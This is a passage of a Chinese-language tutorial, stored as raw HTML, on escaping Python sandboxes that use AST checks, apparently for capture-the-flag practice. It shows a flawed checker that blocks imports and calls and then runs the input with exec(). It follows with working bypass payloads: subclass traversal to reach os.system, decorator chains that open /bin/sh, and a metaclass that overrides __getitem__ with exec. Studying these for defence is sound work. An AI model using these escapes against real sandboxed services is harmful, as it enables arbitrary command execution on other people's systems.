class=&#34;line&#34;&gt;33&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;34&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;35&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;36&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;import&lt;/span&gt; ast&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;import&lt;/span&gt; sys&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;import&lt;/span&gt; os&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;def&lt;/span&gt; &lt;span class=&#34;title function_&#34;&gt;verify_secure&lt;/span&gt;(&lt;span class=&#34;params&#34;&gt;m&lt;/span&gt;):&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;keyword&#34;&gt;for&lt;/span&gt; x &lt;span class=&#34;keyword&#34;&gt;in&lt;/span&gt; ast.walk(m):&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;match&lt;/span&gt; &lt;span class=&#34;built_in&#34;&gt;type&lt;/span&gt;(x):&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;      &lt;span class=&#34;keyword&#34;&gt;case&lt;/span&gt; (ast.Import|ast.ImportFrom|ast.Call):&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;built_in&#34;&gt;print&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;f&amp;quot;ERROR: Banned statement &lt;span class=&#34;subst&#34;&gt;&amp;#123;x&amp;#125;&lt;/span&gt;&amp;quot;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;keyword&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;literal&#34;&gt;False&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;keyword&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;literal&#34;&gt;True&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;abspath = os.path.abspath(__file__)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;dname = os.path.dirname(abspath)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;os.chdir(dname)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;built_in&#34;&gt;print&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;quot;-- Please enter code (last line must contain only --END)&amp;quot;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;source_code = &lt;span class=&#34;string&#34;&gt;&amp;quot;&amp;quot;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;while&lt;/span&gt; &lt;span class=&#34;literal&#34;&gt;True&lt;/span&gt;:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  line = sys.stdin.readline()&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; line.startswith(&lt;span class=&#34;string&#34;&gt;&amp;quot;--END&amp;quot;&lt;/span&gt;):&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;break&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  source_code += line&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;tree = &lt;span class=&#34;built_in&#34;&gt;compile&lt;/span&gt;(source_code, &lt;span class=&#34;string&#34;&gt;&amp;quot;input.py&amp;quot;&lt;/span&gt;, &lt;span class=&#34;string&#34;&gt;&amp;#x27;exec&amp;#x27;&lt;/span&gt;, flags=ast.PyCF_ONLY_AST)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; verify_secure(tree):  &lt;span class=&#34;comment&#34;&gt;# Safe to execute!&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;built_in&#34;&gt;print&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;quot;-- Executing safe code:&amp;quot;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  compiled = &lt;span class=&#34;built_in&#34;&gt;compile&lt;/span&gt;(source_code, &lt;span class=&#34;string&#34;&gt;&amp;quot;input.py&amp;quot;&lt;/span&gt;, &lt;span class=&#34;string&#34;&gt;&amp;#x27;exec&amp;#x27;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;built_in&#34;&gt;exec&lt;/span&gt;(compiled)&lt;span class=&#34;comment&#34;&gt;# 获取 sys&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;[ x.__init__.__globals__ &lt;span class=&#34;keyword&#34;&gt;for&lt;/span&gt; x &lt;span class=&#34;keyword&#34;&gt;in&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;&amp;#x27;&amp;#x27;&lt;/span&gt;.__class__.__base__.__subclasses__() &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;&amp;quot;wrapper&amp;quot;&lt;/span&gt; &lt;span class=&#34;keyword&#34;&gt;not&lt;/span&gt; &lt;span class=&#34;keyword&#34;&gt;in&lt;/span&gt; &lt;span class=&#34;built_in&#34;&gt;str&lt;/span&gt;(x.__init__) &lt;span class=&#34;keyword&#34;&gt;and&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;&amp;quot;sys&amp;quot;&lt;/span&gt; &lt;span class=&#34;keyword&#34;&gt;in&lt;/span&gt; x.__init__.__globals__ ][&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;][&lt;span class=&#34;string&#34;&gt;&amp;quot;sys&amp;quot;&lt;/span&gt;]&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;# 获取 os&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;[ x.__init__.__globals__ &lt;span class=&#34;keyword&#34;&gt;for&lt;/span&gt; x &lt;span class=&#34;keyword&#34;&gt;in&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;&amp;#x27;&amp;#x27;&lt;/span&gt;.__class__.__base__.__subclasses__() &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;&amp;quot;&amp;#x27;_sitebuiltins.&amp;quot;&lt;/span&gt; &lt;span class=&#34;keyword&#34;&gt;in&lt;/span&gt; &lt;span class=&#34;built_in&#34;&gt;str&lt;/span&gt;(x) &lt;span class=&#34;keyword&#34;&gt;and&lt;/span&gt; &lt;span class=&#34;keyword&#34;&gt;not&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;&amp;quot;_Helper&amp;quot;&lt;/span&gt; &lt;span class=&#34;keyword&#34;&gt;in&lt;/span&gt; &lt;span class=&#34;built_in&#34;&gt;str&lt;/span&gt;(x) ][&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;][&lt;span class=&#34;string&#34;&gt;&amp;quot;sys&amp;quot;&lt;/span&gt;].modules[&lt;span class=&#34;string&#34;&gt;&amp;quot;os&amp;quot;&lt;/span&gt;]&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;# 其他的 payload 也都不会触发&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;[ x.__init__.__globals__ &lt;span class=&#34;keyword&#34;&gt;for&lt;/span&gt; x &lt;span class=&#34;keyword&#34;&gt;in&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;&amp;#x27;&amp;#x27;&lt;/span&gt;.__class__.__base__.__subclasses__() &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; x.__name__==&lt;span class=&#34;string&#34;&gt;&amp;quot;_wrap_close&amp;quot;&lt;/span&gt;][&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;][&lt;span class=&#34;string&#34;&gt;&amp;quot;system&amp;quot;&lt;/span&gt;](&lt;span class=&#34;string&#34;&gt;&amp;quot;ls&amp;quot;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/div&gt;
&lt;h4 id=&#34;without-call&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#without-call&#34;&gt;#&lt;/a&gt; without call&lt;/h4&gt;
&lt;p&gt;如果基于 AST 的沙箱限制了执行函数，那么就需要找到一种不需要执行函数的方式执行系统命令.&lt;/p&gt;
&lt;h5 id=&#34;装饰器&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#装饰器&#34;&gt;#&lt;/a&gt; 装饰器&lt;/h5&gt;
&lt;p&gt;利用 payload 如下，该 payload 实际上等效于 exec (input (X))&lt;/p&gt;
&lt;div class=&#34;highlight-container&#34; data-rel=&#34;Python&#34;&gt;&lt;figure class=&#34;iseeu highlight python&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta&#34;&gt;@exec&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta&#34;&gt;@input&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;class&lt;/span&gt; &lt;span class=&#34;title class_&#34;&gt;X&lt;/span&gt;:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;pass&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/div&gt;
&lt;p&gt;当我们输入上述的代码后，Python 会打开输入，此时我们再输入 payload 就可以成功执行命令.&lt;/p&gt;
&lt;div class=&#34;highlight-container&#34; data-rel=&#34;Sh&#34;&gt;&lt;figure class=&#34;iseeu highlight sh&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&amp;gt;&amp;gt;&amp;gt; @&lt;span class=&#34;built_in&#34;&gt;exec&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;... @input&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;... class X:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;...     pass&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;... &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;lt;class &lt;span class=&#34;string&#34;&gt;&amp;#x27;__main__.X&amp;#x27;&lt;/span&gt;&amp;gt;__import__(&lt;span class=&#34;string&#34;&gt;&amp;quot;os&amp;quot;&lt;/span&gt;).system(&lt;span class=&#34;string&#34;&gt;&amp;quot;ls&amp;quot;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/div&gt;
&lt;p&gt;由于装饰器不会被解析为调用表达式或语句，因此可以绕过黑名单，最终传入的 payload 是由 input 接收的，因此也不会被拦截.&lt;/p&gt;
&lt;p&gt;其实这样的话，构造其实可以有很多，比如使用单层的装饰器，打开 help 函数.&lt;/p&gt;
&lt;div class=&#34;highlight-container&#34; data-rel=&#34;Python&#34;&gt;&lt;figure class=&#34;iseeu highlight python&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta&#34;&gt;@help&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;class&lt;/span&gt; &lt;span class=&#34;title class_&#34;&gt;X&lt;/span&gt;:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;pass&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/div&gt;
&lt;p&gt;这样可以直接进入帮助文档:&lt;/p&gt;
&lt;div class=&#34;highlight-container&#34; data-rel=&#34;Sh&#34;&gt;&lt;figure class=&#34;iseeu highlight sh&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;Help on class X &lt;span class=&#34;keyword&#34;&gt;in&lt;/span&gt; module __main__:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;class X(builtins.object)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt; |  Data descriptors defined here:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt; |  &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt; |  __dict__&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt; |      dictionary &lt;span class=&#34;keyword&#34;&gt;for&lt;/span&gt; instance variables (&lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; defined)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt; |  &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt; |  __weakref__&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt; |      list of weak references to the object (&lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; defined)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;(END)&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/div&gt;
&lt;p&gt;再次输入！sh 即可打开 /bin/sh&lt;/p&gt;
&lt;p&gt;或是给装饰器加一些参数。&lt;/p&gt;
&lt;div class=&#34;highlight-container&#34; data-rel=&#34;Py&#34;&gt;&lt;figure class=&#34;iseeu highlight py&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;import&lt;/span&gt; os&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;def&lt;/span&gt; &lt;span class=&#34;title function_&#34;&gt;fake_wrapper&lt;/span&gt;(&lt;span class=&#34;params&#34;&gt;f&lt;/span&gt;):&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;keyword&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;&amp;#x27;/bin/sh&amp;#x27;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta&#34;&gt;@getattr(&lt;span class=&#34;params&#34;&gt;os,&lt;span class=&#34;string&#34;&gt;&amp;quot;system&amp;quot;&lt;/span&gt;&lt;/span&gt;)&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta&#34;&gt;@fake_wrapper&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;def&lt;/span&gt; &lt;span class=&#34;title function_&#34;&gt;something&lt;/span&gt;():&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;keyword&#34;&gt;pass&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/div&gt;
&lt;p&gt;相当于：&lt;/p&gt;
&lt;div class=&#34;highlight-container&#34; data-rel=&#34;Plaintext&#34;&gt;&lt;figure class=&#34;iseeu highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;getattr(os,&amp;quot;system&amp;quot;)(fake_wrapper(something))&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/div&gt;
&lt;p&gt;亦或者自定义一个装饰器：&lt;/p&gt;
&lt;div class=&#34;highlight-container&#34; data-rel=&#34;Py&#34;&gt;&lt;figure class=&#34;iseeu highlight py&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;import&lt;/span&gt; os&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;def&lt;/span&gt; &lt;span class=&#34;title function_&#34;&gt;fake_wrapper&lt;/span&gt;(&lt;span class=&#34;params&#34;&gt;f&lt;/span&gt;):&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;keyword&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;&amp;#x27;/bin/sh&amp;#x27;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta&#34;&gt;@os.system&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta&#34;&gt;@fake_wrapper&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;def&lt;/span&gt; &lt;span class=&#34;title function_&#34;&gt;something&lt;/span&gt;():&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;keyword&#34;&gt;pass&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/div&gt;
&lt;p&gt;相当于  &lt;code&gt;os.system(fake_wrapper(something))&lt;/code&gt; ，也就是  &lt;code&gt;os.system(‘/bin/sh’)&lt;/code&gt;&lt;/p&gt;
&lt;h5 id=&#34;函数覆盖&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#函数覆盖&#34;&gt;#&lt;/a&gt; 函数覆盖&lt;/h5&gt;
&lt;p&gt;我们知道在 Python 中获取一个的属性例如  &lt;code&gt;obj[argument]&lt;/code&gt;  实际上是调用的  &lt;code&gt;obj.__getitem__&lt;/code&gt;  方法。因此只需要覆盖其  &lt;code&gt;__getitem__&lt;/code&gt;  方法，即可在使用  &lt;code&gt;obj[argument]&lt;/code&gt;  执行代码:&lt;/p&gt;
&lt;div class=&#34;highlight-container&#34; data-rel=&#34;Python&#34;&gt;&lt;figure class=&#34;iseeu highlight python&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta&#34;&gt;&amp;gt;&amp;gt;&amp;gt; &lt;/span&gt;&lt;span class=&#34;keyword&#34;&gt;class&lt;/span&gt; &lt;span class=&#34;title class_&#34;&gt;A&lt;/span&gt;:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta&#34;&gt;... &lt;/span&gt;    __getitem__ = &lt;span class=&#34;built_in&#34;&gt;exec&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta&#34;&gt;... &lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta&#34;&gt;&amp;gt;&amp;gt;&amp;gt; &lt;/span&gt;A()[&lt;span class=&#34;string&#34;&gt;&amp;#x27;__import__(&amp;quot;os&amp;quot;).system(&amp;quot;ls&amp;quot;)&amp;#x27;&lt;/span&gt;]&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/div&gt;
&lt;p&gt;但是这里调用了 A 的构造函数，因此 AST 中还是会出现 ast.Call. 如何在不执行构造函数的情况下获取类实例呢？&lt;/p&gt;
&lt;h6 id=&#34;metaclass-利用&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#metaclass-利用&#34;&gt;#&lt;/a&gt; metaclass 利用&lt;/h6&gt;
&lt;p&gt;Python 中提供了一种元类 (metaclass) 概念。元类是创建类的 “类”。在 Python 中，类本身也是对象，元类就是创建这些类（即类的对象）的类。&lt;/p&gt;
&lt;p&gt;元类在 Python 中的作用主要是用来创建类。类是对象的模板，而元类则是类的模板。元类定义了类的行为和属性，就像类定义了对象的行为和属性一样。&lt;/p&gt;
&lt;p&gt;下面是基于元类的 payload, 在不使用构造函数的情况下触发&lt;/p&gt;
&lt;div class=&#34;highlight-container&#34; data-rel=&#34;Py&#34;&gt;&lt;figure class=&#34;iseeu highlight py&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;class&lt;/span&gt; &lt;span class=&#34;title class_&#34;&gt;Metaclass&lt;/span&gt;(&lt;span class=&#34;title class_ inherited__&#34;&gt;type&lt;/span&gt;):&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    __getitem__ = &lt;span class=&#34;built_in&#34;&gt;exec&lt;/span&gt; &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;class&lt;/span&gt; &lt;span class=&#34;title class_&#34;&gt;Sub&lt;/span&gt;(metaclass=Metaclass):&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;pass&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span 